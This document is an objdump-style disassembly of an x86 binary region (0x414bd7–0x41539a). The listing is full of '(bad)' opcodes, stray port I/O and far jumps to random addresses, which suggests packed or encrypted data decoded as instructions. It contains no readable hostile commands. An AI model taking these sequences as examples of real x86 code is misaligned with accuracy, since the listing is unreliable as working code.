  414bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bd8:	adc    ch,al
  414bda:	ins    DWORD PTR es:[edi],dx
  414bdb:	jl     0x414b6d
  414bdd:	pop    edi
  414bde:	sbb    ebp,DWORD PTR [ebx-0x704157e5]
  414be4:	std    
  414be5:	mov    al,ds:0xfe57b6c0
  414bea:	push   cs
  414beb:	mov    DWORD PTR [ebp+0x4c],esi
  414bee:	inc    ebx
  414bef:	cmc    
  414bf0:	ja     0x414c19
  414bf2:	jl     0x414bfb
  414bf4:	jl     0x414baa
  414bf6:	out    dx,al
  414bf7:	mov    eax,ds:0x5aa22520
  414bfc:	lods   al,BYTE PTR ds:[esi]
  414bfd:	cs std 
  414bff:	sub    eax,0x47cf36b7
  414c04:	add    eax,ebx
  414c06:	and    dl,BYTE PTR [ebx+0x6]
  414c09:	iret   
  414c0a:	cld    
  414c0b:	pop    edx
  414c0c:	loop   0x414bfe
  414c0e:	jae    0x414c49
  414c10:	xchg   dl,al
  414c12:	jbe    0x414bc2
  414c14:	hlt    
  414c15:	inc    esp
  414c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c17:	push   esi
  414c18:	cwde   
  414c19:	jg     0x414bb6
  414c1b:	pop    esp
  414c1c:	jmp    0x5788:0x3ca94773
  414c23:	lahf   
  414c24:	retf   0x9873
  414c27:	push   ebx
  414c28:	sub    ebp,DWORD PTR [eax+0x58]
  414c2b:	lods   al,BYTE PTR ds:[esi]
  414c2c:	(bad)  
  414c2d:	test   al,0x38
  414c2f:	pop    esp
  414c30:	pop    esp
  414c31:	imul   ebx,DWORD PTR [si-0x229e],0x7291001a
  414c3a:	jmp    0x3b0a2718
  414c3f:	add    bh,BYTE PTR [edx]
  414c41:	div    BYTE PTR [edx+0x30c76266]
  414c47:	jno    0x414c35
  414c49:	mov    esp,0xbddffd6d
  414c4e:	pop    ds
  414c4f:	fldl2t 
  414c51:	mov    ds:0x8e0ed9c7,eax
  414c56:	sbb    eax,ebx
  414c58:	dec    edi
  414c59:	jge    0x414bf0
  414c5b:	mov    DWORD PTR [esi+eiz*8-0x73],ebp
  414c5f:	xor    BYTE PTR [ecx-0x3e41f1cd],bh
  414c65:	add    DWORD PTR [esi-0x6890e5b1],edi
  414c6b:	nop
  414c6c:	mov    bh,0xa3
  414c6e:	pop    esp
  414c6f:	aad    0x5a
  414c71:	fidiv  DWORD PTR [eax+0x6836a0be]
  414c77:	test   esp,edi
  414c79:	mov    dh,0x4c
  414c7b:	xchg   esp,eax
  414c7c:	mov    ecx,0xf582677f
  414c81:	push   es
  414c82:	cdq    
  414c83:	fisub  DWORD PTR ds:0x8a79255d
  414c89:	sbb    DWORD PTR [ecx],ebx
  414c8b:	daa    
  414c8c:	pop    DWORD PTR ds:0xc9cf9d7c
  414c92:	in     al,0x27
  414c94:	xor    al,0xd
  414c96:	and    DWORD PTR [edx+0x252e8dd1],esi
  414c9c:	ja     0x414ce2
  414c9e:	pop    ebp
  414c9f:	fs test esp,ecx
  414ca2:	sub    eax,0xad29ce31
  414ca7:	mov    eax,0x250f8cf4
  414cac:	gs repnz dec esi
  414caf:	xchg   esp,eax
  414cb0:	mov    edi,0x144d638a
  414cb5:	mov    esp,0x350303ec
  414cba:	out    0xb2,eax
  414cbc:	cdq    
  414cbd:	cs data16 arpl sp,ax
  414cc1:	pop    edx
  414cc2:	int    0xc7
  414cc4:	dec    esi
  414cc5:	aas    
  414cc6:	sbb    ecx,DWORD PTR ds:0xb8c2606d
  414ccc:	xchg   DWORD PTR [eax],eax
  414cce:	push   esp
  414ccf:	ret    0xe768
  414cd2:	fistp  QWORD PTR [edi]
  414cd4:	(bad)  
  414cd5:	cmc    
  414cd6:	pop    ecx
  414cd7:	out    dx,eax
  414cd8:	sbb    ecx,edi
  414cda:	hlt    
  414cdb:	ss mov dh,ch
  414cde:	xor    edi,DWORD PTR [edx]
  414ce0:	and    al,0x5
  414ce2:	cdq    
  414ce3:	or     eax,0x9879273e
  414ce8:	sar    BYTE PTR [edx+eax*8+0x68c38009],cl
  414cef:	stc    
  414cf0:	rcr    BYTE PTR [ebx+0x47],1
  414cf3:	test   eax,0x1ed45062
  414cf8:	xchg   esi,eax
  414cf9:	dec    ecx
  414cfa:	dec    ebp
  414cfb:	pop    esp
  414cfc:	in     al,0xc7
  414cfe:	ror    BYTE PTR [ecx-0x50],1
  414d01:	xor    esp,DWORD PTR [ebp+0x32783e37]
  414d07:	jle    0x414d57
  414d09:	mov    cl,0x6
  414d0b:	jg     0x414d54
  414d0d:	fcomp  QWORD PTR [edi]
  414d0f:	push   cs
  414d10:	stos   BYTE PTR es:[edi],al
  414d11:	rol    BYTE PTR [ebp+0x62098b33],cl
  414d17:	mov    gs,WORD PTR [eax-0x5f10a322]
  414d1d:	mov    WORD PTR [eax-0x67],gs
  414d20:	sub    BYTE PTR [ebp-0x17e190b7],al
  414d26:	xchg   ecx,eax
  414d27:	jmp    0x4b1d:0xe61af620
  414d2e:	pavgw  mm7,QWORD PTR [ecx-0x6b]
  414d32:	mov    bh,BYTE PTR [eax-0x6c]
  414d35:	aaa    
  414d36:	jecxz  0x414d06
  414d38:	push   cs
  414d39:	xchg   edi,eax
  414d3a:	ss cld 
  414d3c:	pop    ebx
  414d3d:	es dec esp
  414d3f:	cwde   
  414d40:	int    0x9
  414d42:	dec    edx
  414d43:	arpl   WORD PTR [esi-0x4873aa94],bx
  414d49:	je     0x414da7
  414d4b:	inc    ebp
  414d4c:	bound  ecx,QWORD PTR [ecx-0x66ef0330]
  414d52:	jne    0x414d3b
  414d54:	or     edx,eax
  414d56:	pop    ss
  414d57:	cmp    DWORD PTR [edx+0x69],ebp
  414d5a:	fmul   DWORD PTR ds:0x6333eee
  414d60:	loopne 0x414cee
  414d62:	or     DWORD PTR [esi+edx*1+0x55],edx
  414d66:	push   edi
  414d67:	xchg   edi,eax
  414d68:	push   0x7f
  414d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d6b:	mov    ds:0x7e0d56d,eax
  414d70:	mov    eax,0x20b6276f
  414d75:	int3   
  414d76:	ret    
  414d77:	dec    esi
  414d78:	jp     0x414daf
  414d7a:	loop   0x414d73
  414d7c:	push   esi
  414d7d:	cs (bad) 
  414d7f:	xchg   esi,eax
  414d80:	call   esp
  414d82:	out    dx,al
  414d83:	bound  edi,QWORD PTR [ebp-0x4e]
  414d86:	push   ds
  414d87:	call   0x1366:0x6124b1de
  414d8e:	dec    esp
  414d8f:	inc    edx
  414d90:	lock les esi,FWORD PTR [esi]
  414d93:	cmp    esi,DWORD PTR [ebp+0x388bf053]
  414d99:	xor    al,0x58
  414d9b:	and    edi,0x65
  414d9e:	icebp  
  414d9f:	adc    al,0x20
  414da1:	lock je 0x414d85
  414da4:	in     al,0x36
  414da6:	and    cl,BYTE PTR [eax]
  414da8:	sbb    esi,DWORD PTR es:[ebp+0x13]
  414dac:	sub    al,0xfb
  414dae:	data16 std 
  414db0:	pop    edx
  414db1:	clc    
  414db2:	cmp    BYTE PTR [ebx-0x4c61157a],dh
  414db8:	outs   dx,BYTE PTR ds:[esi]
  414db9:	(bad)  
  414dbb:	or     ecx,eax
  414dbd:	clc    
  414dbe:	sar    al,0x53
  414dc1:	inc    ebp
  414dc2:	mov    ds:0x4f0f01f3,eax
  414dc7:	pusha  
  414dc8:	push   ecx
  414dc9:	or     eax,0x8f43aaa5
  414dce:	(bad)  
  414dcf:	or     BYTE PTR [esi-0x67],cl
  414dd2:	xchg   esi,eax
  414dd3:	or     DWORD PTR [edi-0x5e9b603f],0xffffffaf
  414dda:	xor    eax,0x6b510714
  414ddf:	fld    QWORD PTR [ecx-0x174d0b2c]
  414de5:	leave  
  414de6:	sbb    ebp,DWORD PTR [eax-0x58]
  414de9:	mov    bh,dh
  414deb:	jecxz  0x414d7e
  414ded:	stos   BYTE PTR es:[edi],al
  414dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414def:	add    DWORD PTR [ebp-0x2c],ebx
  414df2:	inc    esp
  414df3:	rcr    ch,1
  414df5:	inc    esp
  414df6:	dec    ecx
  414df7:	sub    BYTE PTR [eax],dl
  414df9:	jmp    0x414db1
  414dfb:	std    
  414dfc:	mov    ah,BYTE PTR [ebp+0x95fa994]
  414e02:	ret    0xa861
  414e05:	add    eax,0xd6a952ab
  414e0a:	int    0x2a
  414e0c:	dec    ecx
  414e0d:	shl    DWORD PTR [edi-0x4d82c4ae],0xc5
  414e14:	mov    ch,0xa0
  414e16:	push   ds
  414e17:	jp     0x414ddf
  414e19:	in     al,0xc7
  414e1b:	(bad)  
  414e1c:	in     eax,dx
  414e1d:	cmp    DWORD PTR [ecx+0xd],esp
  414e20:	inc    edx
  414e21:	std    
  414e22:	lods   eax,DWORD PTR ds:[esi]
  414e23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e24:	sub    ebp,DWORD PTR [ecx+0x59]
  414e27:	sar    al,cl
  414e29:	adc    BYTE PTR [ebp+0x2b],0x5
  414e2d:	repnz adc DWORD PTR [eax+0x3d4c6dc2],esi
  414e34:	xor    BYTE PTR [ebp-0x5a],ch
  414e37:	xor    ebx,DWORD PTR ds:0x4c59fd60
  414e3d:	inc    esp
  414e3e:	mov    BYTE PTR [ecx-0x59],bl
  414e41:	pop    DWORD PTR [ebx+0x2bf97e14]
  414e47:	xchg   edx,eax
  414e48:	push   ecx
  414e49:	sub    ebx,DWORD PTR [ebp-0x75d4371c]
  414e4f:	inc    ebx
  414e50:	adc    eax,0xd8e194c7
  414e55:	repz xchg edx,eax
  414e57:	jle    0x414e9c
  414e59:	push   edi
  414e5a:	adc    eax,0x7ef870f8
  414e5f:	sub    ah,ch
  414e61:	sbb    BYTE PTR [eax-0x21],ah
  414e64:	mov    dl,0xd2
  414e66:	lds    ecx,FWORD PTR [ecx-0x78]
  414e69:	in     al,dx
  414e6a:	call   0x8ec3c809
  414e6f:	add    DWORD PTR [ecx],esi
  414e71:	sbb    ebx,ecx
  414e73:	xchg   esp,eax
  414e74:	sbb    edi,DWORD PTR [edi]
  414e76:	jnp    0x414e40
  414e78:	outs   dx,DWORD PTR ds:[esi]
  414e79:	push   0xffffffa9
  414e7b:	outs   dx,DWORD PTR ds:[esi]
  414e7c:	fdiv   DWORD PTR [eax-0xcf3f94a]
  414e82:	pop    edx
  414e83:	inc    edx
  414e84:	xor    BYTE PTR [esi+0x7d],ch
  414e87:	out    dx,al
  414e88:	add    edx,edi
  414e8a:	(bad)  
  414e8b:	retf   
  414e8c:	les    eax,FWORD PTR [ebp+0x79bb6834]
  414e92:	arpl   WORD PTR [edx+0x71],ax
  414e95:	(bad)
  414e99:	push   ss
  414e9a:	mov    fs,WORD PTR [ebx+esi*2]
  414e9d:	pusha  
  414e9e:	hlt    
  414e9f:	add    BYTE PTR [eax-0x66ecc5aa],dl
  414ea5:	mov    eax,ds:0x6ca096fb
  414eaa:	push   0x8cffe7c9
  414eaf:	mov    ebx,0x1a491e0e
  414eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eb5:	idiv   DWORD PTR [ebx-0x5d768664]
  414ebb:	dec    ebx
  414ebc:	mov    ds:0xec2bef88,eax
  414ec1:	and    BYTE PTR [esi+ebx*8],ch
  414ec4:	inc    ebx
  414ec5:	mov    esp,0x292b80b7
  414eca:	popf   
  414ecb:	aad    0x78
  414ecd:	jmp    0xb1653b02
  414ed2:	jmp    0xa246e093
  414ed7:	aad    0x4a
  414ed9:	jle    0x414ea2
  414edb:	xchg   esi,eax
  414edc:	xor    eax,0x1e815e1e
  414ee1:	fxch   st(5)
  414ee3:	inc    ebp
  414ee4:	aaa    
  414ee5:	pop    ds
  414ee6:	js     0x414efc
  414ee8:	sbb    ecx,DWORD PTR [ebp+ebx*8+0x518fb59d]
  414eef:	ins    BYTE PTR es:[edi],dx
  414ef0:	mov    ah,0x47
  414ef2:	jp     0x414f63
  414ef4:	pop    esp
  414ef5:	push   cs
  414ef6:	mov    bl,0x71
  414ef8:	imul   ecx,DWORD PTR [ebp-0x6d],0x89671193
  414eff:	push   ds
  414f00:	dec    esi
  414f01:	ins    DWORD PTR es:[edi],dx
  414f02:	xlat   BYTE PTR ds:[ebx]
  414f03:	cli    
  414f04:	sbb    al,0x88
  414f06:	mov    esi,0xddd67672
  414f0b:	xlat   BYTE PTR ds:[ebx]
  414f0c:	pop    ds
  414f0d:	je     0x414f35
  414f0f:	add    al,0xc1
  414f11:	xor    eax,DWORD PTR [edx+edi*8]
  414f14:	add    al,0x63
  414f16:	sahf   
  414f17:	jle    0x414f30
  414f19:	mov    bh,0x18
  414f1b:	call   0xeeff:0x966a971e
  414f22:	outs   dx,DWORD PTR ds:[esi]
  414f23:	jnp    0x414eda
  414f25:	mov    esi,0xef3e2684
  414f2a:	pop    ss
  414f2b:	(bad)  
  414f2d:	adc    al,0x9f
  414f2f:	push   ebp
  414f30:	mov    al,0x36
  414f32:	pop    ebp
  414f33:	add    eax,0x5f976f
  414f38:	hlt    
  414f39:	loope  0x414f07
  414f3b:	data16 rol al,cl
  414f3e:	pop    ds
  414f3f:	ror    BYTE PTR [ebx-0xc37bb77],cl
  414f45:	sub    al,0xc6
  414f47:	shr    dh,0xb7
  414f4a:	mov    ecx,0x827d04dd
  414f4f:	inc    edi
  414f50:	mov    bh,0x8d
  414f52:	cmp    ecx,eax
  414f54:	stos   DWORD PTR es:[edi],eax
  414f55:	ss sub al,0xc6
  414f58:	cmp    al,0x36
  414f5a:	(bad)  
  414f5b:	(bad)  
  414f5c:	adc    DWORD PTR [edi+0x55],ecx
  414f5f:	jno    0x414f0d
  414f61:	and    edx,ebx
  414f63:	push   ebx
  414f64:	or     DWORD PTR [edx],edx
  414f66:	dec    ebx
  414f67:	ret    0x4c14
  414f6a:	adc    eax,0x5bc4b90c
  414f6f:	or     eax,DWORD PTR [ebx-0x2f]
  414f72:	pusha  
  414f73:	mov    ebx,0xfd5127a7
  414f78:	lea    ebx,[ebx]
  414f7a:	jmp    0xf9ed:0x9868b7a
  414f81:	or     DWORD PTR [edx+esi*1],ebx
  414f84:	adc    ch,dl
  414f86:	mov    ds:0xbc68d43c,eax
  414f8b:	inc    ecx
  414f8c:	inc    edx
  414f8d:	pop    ss
  414f8e:	add    eax,DWORD PTR [eax-0x14]
  414f91:	in     al,0x67
  414f93:	jno    0x414f35
  414f95:	imul   edi,DWORD PTR [ebp+ebp*1+0x3345b6f7],0xffffffd8
  414f9d:	jmp    0x266f25f4
  414fa2:	popa   
  414fa3:	cwde   
  414fa4:	pop    ecx
  414fa5:	pop    edx
  414fa6:	and    bl,bh
  414fa8:	and    cl,bh
  414faa:	mov    ebx,0x75fb851
  414faf:	jnp    0x415003
  414fb1:	xchg   BYTE PTR [esi+0x3d],ch
  414fb4:	xor    cl,0xa9
  414fb7:	call   FWORD PTR [ecx+eiz*8]
  414fba:	or     eax,0x64b81d73
  414fbf:	dec    edi
  414fc0:	imul   ebp,eax,0x10f69339
  414fc6:	aas    
  414fc7:	mov    bh,0xea
  414fc9:	add    DWORD PTR [eax],eax
  414fcb:	cmp    ch,bh
  414fcd:	cs fadd st,st(4)
  414fd0:	inc    ebp
  414fd1:	pop    ds
  414fd2:	ror    esp,cl
  414fd4:	inc    esi
  414fd5:	pop    ebp
  414fd6:	xlat   BYTE PTR ds:[ebx]
  414fd7:	sbb    esi,DWORD PTR [ecx-0x48]
  414fda:	fcmovb st,st(0)
  414fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fdd:	or     al,0x5f
  414fdf:	lods   eax,DWORD PTR ds:[esi]
  414fe0:	xchg   ecx,eax
  414fe1:	xchg   esi,eax
  414fe2:	js     0x41503f
  414fe4:	(bad)  
  414fe5:	mov    WORD PTR [esi],?
  414fe7:	jmp    0x414f9c
  414fe9:	es in  al,dx
  414feb:	jecxz  0x414ff8
  414fed:	and    ebx,edx
  414fef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ff0:	fsubr  st,st(3)
  414ff2:	pop    eax
  414ff3:	enter  0x7d95,0x51
  414ff7:	lock retf 
  414ff9:	push   cs
  414ffa:	mov    dl,BYTE PTR [edi+eiz*2-0x33]
  414ffe:	lahf   
  414fff:	inc    edx
  415000:	sbb    dh,BYTE PTR [ecx]
  415002:	xlat   BYTE PTR ds:[ebx]
  415003:	shl    eax,1
  415005:	push   0xbf37389a
  41500a:	inc    edi
  41500b:	call   0xab3a:0x99fafd64
  415012:	push   ecx
  415013:	ss jne 0x414fe2
  415016:	jb     0x414fcd
  415018:	adc    al,BYTE PTR [ebx+edx*4]
  41501b:	lods   al,BYTE PTR ds:[esi]
  41501c:	daa    
  41501d:	lods   eax,DWORD PTR cs:[esi]
  41501f:	and    eax,0xc30982d0
  415024:	mov    bl,0x2a
  415026:	xchg   esp,eax
  415027:	cmp    eax,0xb05ac0ee
  41502c:	clc    
  41502d:	mov    WORD PTR [edx],?
  41502f:	jcxz   0x415055
  415032:	xor    BYTE PTR [ecx],bl
  415034:	pop    ds
  415035:	sub    ebp,ebp
  415037:	sub    eax,0x4eeb0a06
  41503c:	in     al,0xeb
  41503e:	mov    ch,0x7b
  415040:	es aad 0xad
  415043:	mov    esi,ebp
  415045:	or     BYTE PTR [ebx],0xbd
  415048:	cmp    dl,BYTE PTR [ebp-0x575d43d5]
  41504e:	mov    cl,dh
  415050:	lods   al,BYTE PTR ds:[esi]
  415051:	das    
  415052:	popf   
  415053:	jno    0x415049
  415055:	mov    cs,WORD PTR [eax-0x41aeea5]
  41505b:	jle    0x41500d
  41505d:	scas   eax,DWORD PTR es:[edi]
  41505e:	push   eax
  41505f:	sub    BYTE PTR [edx],ah
  415061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415062:	loop   0x415064
  415064:	xor    DWORD PTR [eax-0x66],esi
  415067:	ret    
  415068:	sar    BYTE PTR ds:0x2f47cdd1,1
  41506e:	inc    esp
  41506f:	push   edi
  415070:	aaa    
  415071:	mov    ds:0x7e6f4552,al
  415076:	pop    ss
  415077:	pop    esp
  415078:	jns    0x414fff
  41507a:	add    esp,DWORD PTR [esi-0x65]
  41507d:	les    eax,FWORD PTR [edi]
  41507f:	mov    esi,0xc50712a0
  415084:	xchg   ebx,eax
  415085:	cli    
  415086:	xor    dh,BYTE PTR [edx+0x53]
  415089:	repnz mov ecx,0xa16f8590
  41508f:	rol    BYTE PTR [edx-0x7a823add],cl
  415095:	ins    DWORD PTR es:[edi],dx
  415096:	psrlw  mm3,QWORD PTR [eax-0x1b]
  41509a:	xor    BYTE PTR [ebp+eax*1-0x27],bh
  41509e:	mov    ah,0x3b
  4150a0:	ret    
  4150a1:	ror    cl,cl
  4150a3:	dec    edi
  4150a4:	out    0xb3,eax
  4150a6:	jge    0x41505a
  4150a8:	mov    dl,BYTE PTR [ebx-0x35]
  4150ab:	dec    ecx
  4150ac:	and    DWORD PTR [ecx+ebx*8-0x57],eax
  4150b0:	test   eax,0xb5390e55
  4150b5:	xchg   BYTE PTR [ecx+edi*2],bl
  4150b8:	repnz sbb DWORD PTR [esi+ecx*1+0x61efad95],esi
  4150c0:	cli    
  4150c1:	push   ss
  4150c2:	stc    
  4150c3:	cld    
  4150c4:	push   ds
  4150c5:	fucom  st(2)
  4150c7:	xlat   BYTE PTR ds:[ebx]
  4150c8:	xor    ah,ch
  4150ca:	sub    edi,DWORD PTR [eax-0x2a]
  4150cd:	add    eax,0xb57621f2
  4150d2:	cmc    
  4150d3:	push   0x82eb0d75
  4150d8:	cmp    DWORD PTR [ebx+0x57],esi
  4150db:	jle    0x4150af
  4150dd:	xor    BYTE PTR [esi],bh
  4150df:	ret    0xd0ae
  4150e2:	inc    ebx
  4150e3:	and    bh,BYTE PTR [esp+esi*4]
  4150e6:	add    edi,esp
  4150e8:	cmp    eax,DWORD PTR [ebp+0xd8189b1]
  4150ee:	aas    
  4150ef:	adc    bl,BYTE PTR [edx-0x35]
  4150f2:	inc    ebx
  4150f3:	cmp    ch,cl
  4150f5:	pop    edi
  4150f6:	mov    eax,ds:0x3a526ca4
  4150fb:	sub    DWORD PTR [esi-0x75],0xffffffd0
  4150ff:	rol    DWORD PTR [ebx+eax*8-0x4f7d9b99],1
  415106:	mov    dh,0xa9
  415108:	icebp  
  415109:	fidivr WORD PTR [ebp-0x2fa3a788]
  41510f:	loopne 0x41513f
  415111:	xor    cl,ah
  415113:	clc    
  415114:	adc    eax,0x5c264f37
  415119:	or     eax,ebx
  41511b:	call   0x270b:0xe3f671ac
  415122:	les    eax,FWORD PTR [edx]
  415124:	sbb    eax,0xe598fb
  415129:	jp     0x415191
  41512b:	inc    ebp
  41512c:	sbb    eax,0x4a2c769
  415131:	aad    0x4b
  415133:	mov    esi,edx
  415135:	call   0xd0520a7c
  41513a:	mov    ebx,0x82548e75
  41513f:	cmp    dh,BYTE PTR [ebx+0x22]
  415142:	std    
  415143:	mov    ebp,0xeb851764
  415148:	pop    ebx
  415149:	add    eax,DWORD PTR [eax]
  41514b:	add    al,0xd6
  41514d:	dec    edx
  41514e:	dec    ecx
  41514f:	loop   0x415120
  415151:	out    dx,eax
  415152:	js     0x415114
  415154:	dec    esi
  415155:	mov    ds:0x70f54574,al
  41515a:	sub    DWORD PTR [esi-0x3f],ecx
  41515d:	(bad)  
  41515f:	sar    DWORD PTR [ebx],0x42
  415162:	inc    ecx
  415163:	scas   al,BYTE PTR es:[edi]
  415164:	sub    al,ch
  415166:	sbb    al,0x8a
  415168:	leave  
  415169:	pop    esi
  41516a:	std    
  41516b:	mov    ch,0x56
  41516d:	ret    
  41516e:	not    DWORD PTR [edi+0x33]
  415171:	enter  0x2588,0x43
  415175:	fadd   DWORD PTR [esi]
  415177:	xchg   esp,eax
  415178:	in     al,0x29
  41517a:	cmp    edi,DWORD PTR [esi]
  41517c:	test   al,0x41
  41517e:	sbb    BYTE PTR [ebp+0x14],ch
  415181:	and    ebp,DWORD PTR [ecx-0x24fd983]
  415187:	call   0x3934:0xedb2bebd
  41518e:	out    0x58,al
  415190:	cmp    ecx,eax
  415192:	aaa    
  415193:	fadd   QWORD PTR ds:0x5145f0a7
  415199:	lock xor al,0x4f
  41519c:	dec    ecx
  41519d:	bound  esi,QWORD PTR [eax]
  41519f:	lds    ecx,FWORD PTR ds:0x484123b2
  4151a5:	into   
  4151a6:	sub    al,0xbd
  4151a8:	cli    
  4151a9:	sahf   
  4151aa:	sub    al,0x8e
  4151ac:	jne    0x415207
  4151ae:	retf   0xd0cd
  4151b1:	sub    edi,edx
  4151b3:	dec    esp
  4151b4:	pop    ebp
  4151b5:	lahf   
  4151b6:	jmp    0x415170
  4151b8:	cmp    dl,BYTE PTR [esi+0x55]
  4151bb:	add    BYTE PTR [ebx],bl
  4151bd:	push   0xb9193313
  4151c2:	aas    
  4151c3:	outs   dx,BYTE PTR ds:[esi]
  4151c4:	add    al,0x1e
  4151c6:	or     eax,0xa488d94b
  4151cb:	mov    gs,esi
  4151cd:	(bad)  
  4151ce:	imul   eax,DWORD PTR ds:0x963b86eb,0x496da040
  4151d8:	add    DWORD PTR [ebx],0xffffff88
  4151db:	add    al,0x82
  4151dd:	and    dh,ah
  4151df:	adc    DWORD PTR [ecx],ecx
  4151e1:	jnp    0x41516f
  4151e3:	out    dx,eax
  4151e4:	retf   
  4151e5:	sbb    al,BYTE PTR [edx+0x3d]
  4151e8:	nop
  4151e9:	(bad)  
  4151ea:	das    
  4151eb:	scas   eax,DWORD PTR es:[edi]
  4151ec:	mov    fs,WORD PTR [esi-0x1d]
  4151ef:	mov    ds:0xc1ac79ab,al
  4151f4:	out    0xa9,al
  4151f6:	inc    edi
  4151f7:	test   al,0x3
  4151f9:	push   ebp
  4151fa:	sub    esp,esi
  4151fc:	add    al,0x99
  4151fe:	icebp  
  4151ff:	push   cs
  415200:	mov    ds:0x6279cfa4,al
  415205:	stos   DWORD PTR es:[edi],eax
  415206:	sub    esi,DWORD PTR [edi+0xe]
  415209:	mov    cl,0x62
  41520b:	sbb    cl,0xdf
  41520e:	add    cl,BYTE PTR [eax]
  415210:	test   eax,0x3b788dd0
  415215:	dec    eax
  415216:	shr    DWORD PTR fs:[ebp+eax*4+0x545f22bc],0xd8
  41521f:	dec    esi
  415220:	and    eax,0xf130d09c
  415225:	mov    ds:0x307ce597,eax
  41522a:	daa    
  41522b:	xchg   BYTE PTR [edi-0x4c29356d],dh
  415231:	or     esi,esi
  415233:	aas    
  415234:	(bad)  
  415235:	and    esp,DWORD PTR [esp+edi*2]
  415238:	pushf  
  415239:	ss dec esp
  41523b:	dec    ecx
  41523c:	xor    dl,BYTE PTR [ecx+0x17f83b3d]
  415242:	adc    bh,BYTE PTR es:[ecx-0x3285d561]
  415249:	into   
  41524a:	xor    ecx,DWORD PTR [edx]
  41524c:	stos   DWORD PTR es:[edi],eax
  41524d:	pop    edx
  41524e:	outs   dx,BYTE PTR ds:[esi]
  41524f:	out    0xff,al
  415251:	mov    edi,0x27b6fdd3
  415256:	gs mov dl,0x4e
  415259:	sub    ecx,edx
  41525b:	sbb    DWORD PTR [ebp-0x533b76db],edx
  415261:	bound  esi,QWORD PTR [ebx+edx*2]
  415264:	fs stc 
  415266:	xchg   edi,eax
  415267:	stc    
  415268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415269:	(bad)  
  41526a:	leave  
  41526b:	mov    ch,0xb
  41526d:	mov    edx,0x5027dc7
  415272:	(bad)  [ecx-0xa]
  415275:	cld    
  415276:	call   0xda017560
  41527b:	mov    edi,0xc1107abe
  415280:	xor    eax,0x69fdf266
  415285:	pop    ecx
  415286:	leave  
  415287:	jo     0x415301
  415289:	and    DWORD PTR [ebp-0x4164a5f1],eax
  41528f:	jecxz  0x4152d1
  415291:	ret    
  415292:	jb     0x415261
  415294:	sti    
  415295:	cmp    eax,0x22984a23
  41529a:	mov    edx,0xd9f3eaae
  41529f:	adc    esi,DWORD PTR [esi]
  4152a1:	jmp    0x415243
  4152a3:	neg    BYTE PTR [eax]
  4152a5:	stos   DWORD PTR es:[edi],eax
  4152a6:	sahf   
  4152a7:	sub    DWORD PTR [ebx-0x16],ebx
  4152aa:	imul   ecx,DWORD PTR [eax+0x62c42e4b]
  4152b1:	mov    al,0x57
  4152b3:	add    al,0xb4
  4152b5:	mov    dl,0x68
  4152b7:	(bad)  
  4152b8:	xor    BYTE PTR cs:[eax+0x16],bh
  4152bc:	inc    DWORD PTR [ecx-0x67]
  4152bf:	in     eax,0x33
  4152c1:	jbe    0x4152df
  4152c3:	mov    ?,WORD PTR [ecx-0x30]
  4152c6:	xchg   edx,eax
  4152c7:	jp     0x41526b
  4152c9:	sub    DWORD PTR [edx+0x12705036],eax
  4152cf:	pop    ds
  4152d0:	dec    esi
  4152d1:	popa   
  4152d2:	push   es
  4152d3:	sbb    dl,ch
  4152d5:	or     al,BYTE PTR [ebx-0x6e]
  4152d8:	or     BYTE PTR [esi-0x47],dh
  4152db:	mov    dh,0xf4
  4152dd:	push   ebx
  4152de:	push   esi
  4152df:	pop    eax
  4152e0:	ss mov esi,0x5d5d11e9
  4152e6:	mov    edi,0xb4b4483a
  4152eb:	in     al,0x87
  4152ed:	popa   
  4152ee:	xor    BYTE PTR [eax+0x7c],0x15
  4152f2:	(bad)  
  4152f3:	cmp    BYTE PTR [esi],bh
  4152f5:	adc    eax,0x6b3cc157
  4152fa:	pushf  
  4152fb:	mov    ebp,0x770a0f49
  415300:	sub    al,0xdc
  415302:	test   eax,0x77e30f52
  415307:	xor    bh,BYTE PTR [ecx+0x2b1f5e35]
  41530d:	add    al,0x33
  41530f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415310:	mov    ch,0xdf
  415312:	push   es
  415313:	shl    BYTE PTR [ebx-0x5d],1
  415316:	sbb    eax,0x90fcbe6a
  41531b:	dec    esp
  41531c:	xchg   edi,eax
  41531d:	dec    edx
  41531e:	retf   0x9ff8
  415321:	sti    
  415322:	fnsave [esi-0x1935acc6]
  415328:	pop    esp
  415329:	mov    BYTE PTR cs:[edx+0x44a45b81],0x78
  415331:	pop    esi
  415332:	in     al,dx
  415333:	or     DWORD PTR [esi],ecx
  415335:	jns    0x4152f9
  415337:	jle    0x4152c4
  415339:	and    ebx,DWORD PTR [ebp-0x6fc83e06]
  41533f:	pop    edi
  415340:	test   BYTE PTR [ebp-0x7581042],ah
  415346:	jb     0x415356
  415348:	pusha  
  415349:	xchg   ebp,eax
  41534a:	sub    al,0x41
  41534c:	faddp  st(3),st
  41534e:	shr    BYTE PTR [esi],1
  415350:	sub    DWORD PTR [eax+0x2102d10c],eax
  415356:	mov    al,ds:0x6f4c3793
  41535b:	mov    WORD PTR [ecx-0x1f8cbdb],gs
  415361:	ja     0x415345
  415363:	push   ss
  415364:	aas    
  415365:	dec    eax
  415366:	ror    DWORD PTR [ecx],1
  415368:	(bad)  [ecx+0x2b]
  41536b:	dec    ecx
  41536c:	pop    es
  41536d:	sbb    DWORD PTR [bx+si+0x5f],ebp
  415371:	out    dx,eax
  415372:	mov    DWORD PTR [edi+0x16],edx
  415375:	mov    BYTE PTR [edx+0x7a],ah
  415378:	jle    0x41539a
  41537a:	cmp    DWORD PTR [ecx+0x3e89d5ed],edx
  415380:	mov    ebp,0x587cec5
  415385:	and    al,0x66
  415387:	jno    0x4153e9
  415389:	dec    esp
  41538a:	adc    dl,BYTE PTR [edx]
  41538c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41538d:	(bad)  
  41538e:	mov    edx,0xcee5d42f
  415393:	ret    0x1404
  415396:	cmp    eax,DWORD PTR [edi+edi*1-0x2d]
  41539a:	xchg   edx,eax
